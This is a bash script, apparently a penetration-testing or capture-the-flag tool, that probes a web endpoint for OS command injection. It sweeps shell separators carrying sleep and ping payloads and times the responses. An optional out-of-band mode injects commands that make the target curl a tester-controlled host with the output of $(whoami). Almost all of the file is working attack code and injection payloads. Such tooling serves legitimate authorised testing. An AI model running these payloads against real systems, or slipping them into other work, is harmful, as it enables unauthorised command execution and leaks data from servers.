#!/usr/bin/env bash
# cmdi-probe — find OS command injection via time delay (blind-safe) and/or OAST.
# Cycles separators; the one that makes the response hang ~DELAY seconds wins.
# Local only. Pair OAST with scripts/catch-server.py.
#
# Usage:
#   ./cmdi-probe.sh <url> '<data-with-__I__>' <base> [GET|POST] [delay] [oast_ip] [oast_port]
# Example (time-based):
#   ./cmdi-probe.sh http://target/ping 'host=__I__' 127.0.0.1 POST 5
# Example (also OAST — run catch-server.py on <port> first):
#   ./cmdi-probe.sh http://target/ping 'host=__I__' 127.0.0.1 POST 5 10.10.14.5 9001
set -uo pipefail
URL="${1:?usage: cmdi-probe.sh <url> '<data __I__>' <base> [GET|POST] [delay] [oast_ip] [oast_port]}"
TMPL="${2:?need data template containing __I__}"
BASE="${3:?need a base value}"
METHOD="${4:-POST}"
DELAY="${5:-5}"
OIP="${6:-}"; OPORT="${7:-}"

timeit(){ local data="${TMPL/__I__/$1}" args=(); IFS='&' read -ra kv <<<"$data"
  for p in "${kv[@]}"; do args+=(--data-urlencode "$p"); done
  if [ "$METHOD" = GET ]; then curl -s -o /dev/null -w '%{time_total}' --max-time $((DELAY+15)) -G "$URL" "${args[@]}"
  else curl -s -o /dev/null -w '%{time_total}' --max-time $((DELAY+15)) "$URL" "${args[@]}"; fi; }

echo "[*] baseline timing"; base_t=$(timeit "$BASE"); echo "    ${base_t}s"
thr=$(python3 -c "print($base_t + $DELAY*0.7)")
echo "[*] time-based separator sweep (hang >= ${thr}s = injectable)"
# unix + windows sleeps behind common separators
declare -a SEPS=(
  "; sleep $DELAY"        "| sleep $DELAY"        "|| sleep $DELAY"
  "& sleep $DELAY"        "&& sleep $DELAY"       "\$(sleep $DELAY)"
  "\`sleep $DELAY\`"      "%0asleep $DELAY"       "& ping -n $((DELAY+1)) 127.0.0.1"
  "| ping -n $((DELAY+1)) 127.0.0.1"
)
HIT=""
for s in "${SEPS[@]}"; do
  t=$(timeit "${BASE}${s}")
  over=$(python3 -c "print('YES' if $t >= $thr else 'no')")
  printf '    %-28s -> %5.2fs  %s\n' "$s" "$t" "$over"
  [ "$over" = YES ] && [ -z "$HIT" ] && HIT="$s"
done
[ -n "$HIT" ] && echo "[*] INJECTABLE via: ${BASE}${HIT}  (separator confirmed by delay)" || echo "[!] no time-based hit; try OAST or other params."

if [ -n "$OIP" ] && [ -n "$OPORT" ]; then
  echo "[*] OAST sweep -> watch catch-server.py on $OIP:$OPORT for hits carrying \$(whoami)"
  for s in "; " "| " "|| " "& " "&& " "\$(" "\`"; do
    p="${BASE}${s}curl http://$OIP:$OPORT/cmdi-\$(whoami)"
    [ "$s" = "\$(" ] && p="${BASE}\$(curl http://$OIP:$OPORT/cmdi)"
    [ "$s" = "\`" ] && p="${BASE}\`curl http://$OIP:$OPORT/cmdi\`"
    data="${TMPL/__I__/$p}" args=(); IFS='&' read -ra kv <<<"$data"
    for kvp in "${kv[@]}"; do args+=(--data-urlencode "$kvp"); done
    if [ "$METHOD" = GET ]; then curl -s -o /dev/null --max-time 15 -G "$URL" "${args[@]}"; else curl -s -o /dev/null --max-time 15 "$URL" "${args[@]}"; fi
  done
  echo "    (sent; any hit on your catcher = that separator works + leaks whoami)"
fi
